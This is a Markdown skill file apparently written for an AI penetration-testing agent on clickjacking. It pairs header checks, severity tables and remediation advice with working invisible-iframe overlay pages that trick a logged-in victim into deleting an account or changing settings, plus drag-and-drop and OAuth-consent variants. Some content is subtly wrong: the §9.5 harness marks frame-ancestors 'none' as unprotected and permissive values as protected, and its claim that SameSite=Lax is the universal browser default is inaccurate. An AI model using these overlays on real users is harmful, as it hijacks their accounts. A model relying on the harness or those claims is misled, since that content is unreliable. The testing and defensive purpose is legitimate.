---
name: clickjacking
description: "Clickjacking and UI redressing — frame-embedding, X-Frame-Options gaps, and the click-hijack chains"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - clickjacking
  - ui-redressing
  - web
  - browser
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-1021
chains_with:
  - crlf-injection
  - attack-cors
prerequisites: []
severity_boost:
  attack-cors: "Combined with a same-origin trust assumption, framing enables privileged actions"
  crlf-injection: "Injecting X-Frame-Options away removes the only control"
---

# Clickjacking and UI Redressing

> **AI LOAD INSTRUCTION**: The modern reality check comes first: **`SameSite=Lax` — the default
> in every current browser — neutralises most clickjacking against session-cookie
> applications.** A cross-site iframe does not carry `Lax` cookies, so the framed page renders
> logged out and there is nothing to hijack. **Check the cookie attributes before claiming
> impact.**
>
> Clickjacking remains a real finding in these cases: the site sets `SameSite=None`, it
> authenticates with a token in `localStorage` (which the iframe still carries), the action is
> on a page reachable while logged out, or the frame is used for a *different* purpose such as
> UI redressing to trigger an unintended interaction (drag-and-drop exfiltration, permission
> prompts, OAuth consent).
>
> The other half of the skill is testing the protection properly. `X-Frame-Options: ALLOW-FROM`
> is **dead** — no current browser supports it. `frame-ancestors` in a CSP supersedes
> `X-Frame-Options` where both are present. And a `DENY` on one endpoint does not protect the
> endpoint you actually care about.

## 0. RELATED ROUTING

- [clickjacking](../clickjacking/SKILL.md) — the long-form companion; load alongside this file
- [attack-cors](../attack-cors/SKILL.md) — the related origin-trust gap with a different mechanism
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) — the write-side sibling
- [crlf-injection](../crlf-injection/SKILL.md) — injecting the protecting header away
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — consent-screen framing
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — proving a working PoC, not just a missing header

---

## 1. CHECKING THE PROTECTION

**The response headers that matter:**

```bash
curl -s -I https://TARGET/account/settings | grep -iE 'x-frame-options|content-security-policy|set-cookie'
```

| Header value | Verdict |
|---|---|
| `X-Frame-Options: DENY` | protected |
| `X-Frame-Options: SAMEORIGIN` | protected from cross-origin framing |
| `X-Frame-Options: ALLOW-FROM https://x` | **no protection** — unsupported by all current browsers |
| `Content-Security-Policy: frame-ancestors 'none'` | protected |
| `Content-Security-Policy: frame-ancestors 'self'` | protected cross-origin |
| CSP present **without** `frame-ancestors` | **not protected** — CSP does not imply frame protection |
| no relevant header at all | **framable** |

**Two traps to avoid:**

**Trap 1 — `frame-ancestors` supersedes `X-Frame-Options`.** If both are present and disagree,
the CSP wins in any browser that supports CSP `frame-ancestors` (all current browsers). A
report claiming vulnerability because `X-Frame-Options` is absent, while a strict
`frame-ancestors` is set, is wrong.

**Trap 2 — protection is per-endpoint.** Checking the homepage and concluding the site is
protected misses the settings page, the payment confirmation, and the OAuth consent screen.
**Enumerate the sensitive endpoints and check each one.**

**Then check the cookies — this decides whether it matters:**

```bash
curl -s -I https://TARGET/login | grep -i set-cookie
# Set-Cookie: session=...; Path=/; HttpOnly; Secure; SameSite=Lax
```

| `SameSite` | Impact of framing |
|---|---|
| `Strict` | neutralised |
| `Lax` (browser default) | **neutralised for cross-site framing** |
| `None` | **exploitable** |
| absent, older browser | exploitable |

---

## 2. THE PoC

**A minimal framing test:**

```html
<!doctype html>
<html>
<head><title>Proof</title></head>
<body>
  <h1>Clickjacking proof — ltx-canary</h1>
  <iframe src="https://TARGET/account/settings" width="1000" height="700"></iframe>
</body>
</html>
```

**If the page renders inside the frame, it is framable.** If it renders blank, the frame was
blocked (or the page is `X-Frame-Options: DENY`).

**Confirm the frame actually loaded** rather than rendering an empty box:

```javascript
const f = document.querySelector('iframe');
f.onload = () => {
  try {
    // Cross-origin access throws — that is expected and means it loaded cross-origin
    f.contentDocument;
  } catch (e) {
    console.log('frame loaded cross-origin (access blocked, as expected)');
  }
};
```

**The decisive test is whether the victim's session is present inside the frame.** Check by
framing a page that displays the user's name or email. If it shows the victim's data, the
session carried; if it shows a login prompt, `SameSite` blocked it and there is no finding.

**That single observation settles the severity.** Do it before writing anything else.

---

## 3. THE OVERLAY PoC

A real clickjacking PoC places an invisible frame over an attractive decoy so the victim's
click lands on the framed control.

```html
<!doctype html>
<html>
<head>
<style>
  #decoy { position:absolute; top:0; left:0; z-index:1; }
  #victim {
    position:relative; width:1000px; height:700px; opacity:0.0001;
    z-index:2; border:0;
  }
</style>
</head>
<body>
  <div id="decoy">
    <h1>Click the button to claim your prize</h1>
    <button style="margin-top:400px">CLAIM NOW</button>
  </div>
  <iframe id="victim" src="https://TARGET/account/settings"></iframe>
</body>
</html>
```

**Position the frame so the target control sits under the decoy button.** The technique is
precision, not trickery — align the invisible control with the visible decoy using the
application's own layout.

**`opacity: 0.0001` rather than `0`** — some browsers ignore hidden iframes for interaction.

**For a proven finding, show the effect:** the action executed (email changed, setting toggled)
after a click intended for the decoy. A screenshot of the overlay alone is not proof; the
resulting state change is.

---

## 4. HIGHER-VALUE VARIANTS

Standard clickjacking is well-defended. These variants are why the class is still reported.

| Variant | Mechanism |
|---|---|
| **OAuth consent framing** | frame the consent screen so the victim authorises your client without realising |
| **Permission prompt framing** | frame a camera/microphone/notification prompt; the click grants it |
| **Drag-and-drop exfiltration** | frame a page and use `dragstart` to move selected text into an attacker-controlled field |
| **Double-click / multi-step** | chain two clicks across a legitimate flow |
| **Likejacking / sharejacking** | frame a social action button |
| **File-upload clickjacking** | frame the upload control so the victim uploads a file you chose |
| **Cursor spoofing** | a fake cursor image makes the visible position differ from the real one |
| **Same-origin cascading** | frame a same-origin page you control inside the target's frame; it inherits the target's origin |

**Drag-and-drop exfiltration is worth a specific mention** because it bypasses the need for a
click on a specific control — the victim's own drag gesture moves data:

```javascript
// On the attacker page: a text field the victim will drag content into
// The framed target's selected content can be dragged into it and captured.
document.addEventListener('drag', e => { /* capture the dragged data */ });
```

**Mobile and touch variants** — touch events do not have a hover state, so a tap can trigger a
control the user never saw highlighted. Test on a touch device where the application is
mobile-facing.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Framing enables a state-changing action with the victim's session | **High (P2)** | the PoC and the resulting state change |
| OAuth consent screen framable, enabling client authorization | **High (P2)** | the framed consent and the resulting grant |
| Permission prompt framable (camera, notifications) | **Medium–High (P3/P2)** | the framed prompt and the granted permission |
| Drag-and-drop exfiltration demonstrated | **Medium (P3)** | the captured content |
| Endpoint framable, session present, no demonstrated action | **Medium (P3)** | the frame with the victim's session visible |
| Endpoint framable, no session (cookies blocked) | **Low–Informational (P5)** | the frame with the login prompt |
| `ALLOW-FROM` used as the only protection | **Medium (P3)** | the header and a working frame |
| Missing header on a public, non-interactive page | **Informational (P5)** | the header |

**Severity follows the action, not the header.** A framable page with no sensitive action is
not a high finding.

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the response headers for the specific endpoint | `X-Frame-Options`, `frame-ancestors`, `SameSite` |
| the PoC HTML | reproduces the framing |
| **a screenshot showing the victim's session content inside the frame** | proves the session carried |
| the `SameSite` attribute from `Set-Cookie` | the control that decides exploitability |
| the resulting state change after the click | the impact proof |
| for OAuth: the framed consent and the resulting authorization | the chain |
| browser and version | framing behaviour varies; establishes reproducibility |
| a **control**: a correctly protected endpoint refusing to frame | proves you can detect protection |

**The screenshot showing the victim's own data inside the frame is the finding.** A blank
frame or a login prompt is not.

**False positives to exclude:**

| Looks like clickjacking | Actually |
|---|---|
| the page is framable but the session cookie is `SameSite=Lax` | no session in the frame |
| the frame renders a login page | not authenticated inside the frame |
| `frame-ancestors` is set and you only checked `X-Frame-Options` | it is protected |
| the page has no sensitive action | no impact |
| `X-Frame-Options: ALLOW-FROM` on a modern browser | treated as unprotected, but verify the frame loads |
| the browser blocked third-party cookies | the session never reaches the frame |
| a screenshot of the overlay with no resulting action | no proven effect |

---

## 7. REMEDIATION REFERENCE

1. **Send `Content-Security-Policy: frame-ancestors 'none'`** — the modern, authoritative control. Use `'self'` only where the application genuinely frames itself.
2. **Keep `X-Frame-Options: DENY` or `SAMEORIGIN` as well** — for older clients that do not implement `frame-ancestors`. Do not use `ALLOW-FROM`; it is unsupported.
3. **Apply the header on every response, not only HTML** — a JSON or error response that renders in a frame is still a framing surface.
4. **Set session cookies `SameSite=Lax` or `Strict`, `HttpOnly`, `Secure`** — this is the control that neutralises clickjacking of authenticated actions, and it is the highest-value fix because it survives a missing frame header.
5. **Require confirmation for sensitive actions** — re-authentication, a typed confirmation, or a CSRF token makes a single click insufficient regardless of framing.
6. **Use a frame-busting defence only as a supplement** — JavaScript frame busting is bypassable (`sandbox` attributes, double framing) and must never be the primary control.
7. **Validate the `Origin`/`Referer` on sensitive state-changing requests** — an action initiated from a framed page carries a foreign `Origin`, which is a reliable signal.
8. **Cover consent and permission screens explicitly** — OAuth consent, permission prompts, and payment confirmations are the highest-value framing targets and are frequently overlooked when headers are applied only to the main application.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Does the framing protection exist - and did you **test the control with it working**? | the missing header is the cause |
| 2 | Did you **complete a state-changing action** in the framed page, seen from the victim's session? | impact, not embeddability |
| 3 | Was there a **user action** in the chain (a click, a drag, a key sequence)? | the attack's practical difficulty |
| 4 | Is the target page **authenticated and state-changing**, or a static page? | whether it matters |
| 5 | Did the browser **actually render** the frame, at a usable size and opacity? | embeddability is visual, not header-only |
| 6 | Did you test **`frame-ancestors`** as well as `X-Frame-Options`, since CSP overrides XFO? | the policy's real state |
| 7 | Did your PoC page require **no scripting in the target page**? | a UI-redress attack, not an XSS chain |

**A completed state-changing action seen from the victim's session is the bar.** A page that merely
renders in an iframe is a header observation unless the client's threat model makes framing itself
meaningful.

---

## 9. EXECUTION PRIMITIVES

Clickjacking is proven by **a state-changing action completed in a framed, authenticated page with a
recorded before/after state**. Every block ends at a server-side state change.

### 9.1 The framing-control pair

```bash
HOST="https://target.example"
# THE CONTROL: a page the client protects - it must refuse framing
curl -sS -D- -o /dev/null "$HOST/settings" 2>&1 | grep -iE 'x-frame-options|content-security-policy|frame-ancestors'
# THE CANDIDATE: the state-changing page - the headers that decide the finding
curl -sS -D- -o /dev/null "$HOST/account/delete" 2>&1 | grep -iE 'x-frame-options|content-security-policy|frame-ancestors'
curl -sS -D- -o /dev/null "$HOST/api/v1/transfer" 2>&1 | grep -iE 'x-frame-options|content-security-policy'
# and the CSP's frame-ancestors, which OVERRIDES X-Frame-Options when both are present
curl -sS -D- -o /dev/null "$HOST/account/delete" 2>&1 | grep -io "frame-ancestors[^;]*"
```

**`frame-ancestors` overrides `X-Frame-Options`.** A page with a permissive `frame-ancestors` and a
restrictive `X-Frame-Options` is framable, and a report that reads only the XFO header gets it backwards.

### 9.2 The verification page, with the action and the before/after

```html
<!-- save as clickjank.html, serve from your origin, open in a browser where the victim is logged in -->
<html><head><style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:800px; opacity:0.0001; z-index:2; border:0; }
  .bait  { position:absolute; top:340px; left:400px; z-index:1; font-size:28px; }
</style></head><body>
  <div class="bait">Click to continue</div>
  <iframe src="https://target.example/account/delete"></iframe>
</body></html>
```

```bash
# THE BEFORE: the state the action will change, recorded server-side before the PoC is opened
curl -sS -H "Cookie: $VICTIM_SESSION" "https://target.example/api/v1/account" | head -c 300; echo
# ... open clickjank.html in the victim's authenticated browser and click the bait ...
# THE AFTER: the same API read again - the change is the finding
curl -sS -H "Cookie: $VICTIM_SESSION" "https://target.example/api/v1/account" | head -c 300; echo
# and the audit record the action produced, which ties it to the victim's session
curl -sS -H "Cookie: $VICTIM_SESSION" "https://target.example/api/v1/audit?limit=5" | head -c 400; echo
```

**The before/after pair on a server-side read is the evidence.** Header absence is a precondition; the
account state changing after the victim's click is the finding.

### 9.3 The interaction requirements, quantified for the report

```html
<!-- drag-and-drop, for actions that require a drag rather than a click -->
<html><head><style>
  #frame { position:absolute; width:900px; height:700px; opacity:0.0001; z-index:2; border:0; }
  #drag  { position:absolute; top:300px; left:350px; width:120px; height:40px; background:#eee; z-index:1; }
</style></head><body>
  <div id="drag">Drag this to the target</div>
  <iframe id="frame" src="https://target.example/settings/security"></iframe>
</body></html>
```

```python
# the report must state the interaction the attack needs - it determines the practical difficulty
print("Record for each finding:")
for row in ["the action performed (a delete, a transfer, a permission change)",
            "the exact interaction: one click, a drag from A to B, or a typed sequence",
            "whether the page can be framed at the required size (some are width-limited)",
            "whether the action requires a confirm dialog the attacker cannot dismiss",
            "whether a CSRF token is read from the page (which would break a blind frame)",
            "the victim's required state: authenticated, and on which session"]:
    print("  -", row)
print()
print("A finding that requires the victim to solve a CAPTCHA, dismiss a dialog, or type a secret")
print("is not a clickjacking finding - it is an interaction the attacker cannot force.")
```

**The interaction requirement belongs in the report.** A one-click delete and a seven-step drag are not
the same finding, and the client's risk decision depends on which one it is.

### 9.4 The header-only cases and their honest reporting

```bash
HOST="https://target.example"
# what the site actually protects, enumerated - this is the report's real content
for p in / /login /settings /account/delete /account/transfer /admin /oauth/authorize; do
  H=$(curl -sS -D- -o /dev/null "$HOST$p" 2>/dev/null)
  XFO=$(printf '%s' "$H" | grep -i '^x-frame-options' | tr -d '\r' | head -1)
  FA=$(printf '%s' "$H" | grep -io 'frame-ancestors[^;]*' | head -1)
  printf '%-22s xfo=%-34s fa=%s\n' "$p" "${XFO:-<none>}" "${FA:-<none>}"
done
# and the JS frame-busting, which is bypassable and must not be reported as a control
curl -sS "$HOST/settings" | grep -oiE 'top *[!=]= *self|top\.location|frameElement' | head -3
```

**JavaScript frame-busting is not a control.** Report it as a bypassable mitigation, and note that
`X-Frame-Options: DENY` or a `frame-ancestors` directive is the fix - a script check is defeated by
`<iframe sandbox="allow-forms">` and by disabling script execution in the framed context.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests
HOST = "https://target.example"
PATHS = ["/", "/login", "/settings", "/account/delete", "/account/transfer", "/oauth/authorize"]
print("%-22s %-20s %-30s %-14s %s" % ("path", "x-frame-options", "frame-ancestors", "js-busting", "verdict"))
for p in PATHS:
    try:
        r = requests.get(f"{HOST}{p}", timeout=10)
        xfo = r.headers.get("X-Frame-Options", "<none>")
        csp = r.headers.get("Content-Security-Policy", "")
        fa = "<none>"
        for part in csp.split(";"):
            if "frame-ancestors" in part: fa = part.strip()
        js = bool(__import__("re").search(r"top\s*[!=]=\s*self|frameElement", r.text))
        protected = xfo.upper() in ("DENY", "SAMEORIGIN") or fa not in ("<none>", "frame-ancestors 'none'")
        weak = fa == "" and xfo == "<none>"
        v = "FRAMABLE" if xfo == "<none>" and fa == "<none>" else ("protected" if protected else "inspect")
        print("%-22s %-20s %-30s %-14s %s" % (p, xfo, fa, js, v))
    except Exception as e:
        print("%-22s ERROR %s" % (p, type(e).__name__))
print()
print("Remember: frame-ancestors in a CSP OVERRIDES X-Frame-Options. Read both, and report the pair.")
print("Then report only paths that are FRAMABLE, authenticated, and state-changing.")
PY
```

**Read both headers, report the pair.** The enumeration is the report's table, and the state-changing
filter is what turns it from a header inventory into a finding.

---

## 10. EVIDENCE STANDARD — FRAMING ARTEFACTS

| Item | Why |
|---|---|
| The **response headers** for the target path (`X-Frame-Options` and `frame-ancestors`) | the precondition |
| The **headers for a protected path** | the control |
| The **PoC page**, self-contained and reproducible | the deliverable |
| The **server-side state change**, read before and after | impact |
| The **exact interaction required** (one click, a drag, a sequence) | the practical difficulty |
| That the victim was **authenticated in the framed context** | the precondition for impact |
| The **audit record** tying the action to the victim's session | the blue-team half |
| Whether the page uses **`X-Frame-Options` only, CSP only, or both** | the fix location |
| Whether a **JS frame-buster** exists and how it was bypassed | a bypassable mitigation, state it as such |
| Confirmation that no **victim action was performed outside the agreed scope** | engagement integrity |

Report the **header pair, the interaction, and the state change**: "`GET /account/delete` returns no
`X-Frame-Options` and no `frame-ancestors` directive, where `GET /settings` returns `X-Frame-Options:
DENY`, which is the control. A page served from `attacker.example` framed `/account/delete` at full
size with the frame at 0.001 opacity, and a single click on the decoy element completed the deletion;
the account state read before the click showed `{\"deleted\":false}` and after showed
`{\"deleted\":true}`, and the audit log records the action against the victim's session from a referer of
the attacker origin. The interaction required is one click with no dialog", never "the site is missing
X-Frame-Options".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A missing header on a **static or public page** | framing it changes nothing |
| A missing header with **no state-changing action** | embeddability without impact |
| A page protected by **`frame-ancestors` but not XFO** | it is protected; CSP overrides |
| A page with **`X-Frame-Options: ALLOW-FROM`** | deprecated and ignored by modern browsers - verify in a browser |
| A JS frame-buster bypass you did **not actually bypass** | an untested claim |
| A page that frames but whose action needs **a dialog or a CAPTCHA** | the attacker cannot force it |
| A finding that requires the victim to **type a secret** | not a UI-redress attack |
| An action that is **read-only** | no state change, no impact |
| A header inventory with **no PoC and no interaction** | an observation, not a finding |
| A finding on a page that **requires an admin session you hold** | check whose session it needs |
| A victim's personal data reproduced in full | a disclosure |

**A state change with the header control.** This family is reported from header inventories more than any
other; the state change and the interaction requirement are what make it a finding.

---

## 11. REMEDIATION REFERENCE — FRAMING HARDENING

1. **Send `Content-Security-Policy: frame-ancestors 'none'` (or a specific allowlist) on every authenticated response** - it is the modern control and it overrides `X-Frame-Options`.
2. **Send `X-Frame-Options: DENY` as well, for older clients** - the pair covers the browser population without relying on one mechanism.
3. **Require a user gesture that cannot be synthesised for destructive actions: a typed confirmation, a re-authentication, or a non-frameable confirmation page** - it breaks the attack at the interaction step.
4. **Mark session cookies `SameSite=Lax` or `Strict`** - it does not stop framing, but it limits the cross-site request context the frame relies on.
5. **Never rely on a JavaScript frame-buster** - it is defeated by a sandboxed iframe and by disabling script execution; use a header.
6. **Apply the headers to `404` and error pages as well as the application pages** - error pages are frequently unprotected and they reveal the frameability of the session.
7. **Require a fresh CSRF token tied to a user gesture for state-changing requests** - a blind framed request cannot read the page's token.
8. **Use a `Content-Security-Policy` `sandbox` directive on any page that embeds third-party content** - it prevents the embedded content from initiating the attack in the other direction.
9. **Log and alert on state-changing requests whose `Referer` is a foreign origin** - the framed attack sends a referer from the attacker's page in most configurations.
10. **Test frameability as part of the release pipeline, with both headers asserted on every authenticated route** - it is a single assertion per route and it is rarely covered.
11. **Present destructive actions on their own page with no adjacent clickable area, and prefer a multi-step confirmation** - it makes the overlay attack require an interaction the attacker cannot force.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the request-forgery theory this shares
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) - the read-side technique where framing is unavailable
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) - the other browser-enforced trust boundary
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) - how a CSP's other directives are bypassed
- [clickjacking](../clickjacking/SKILL.md) - this document
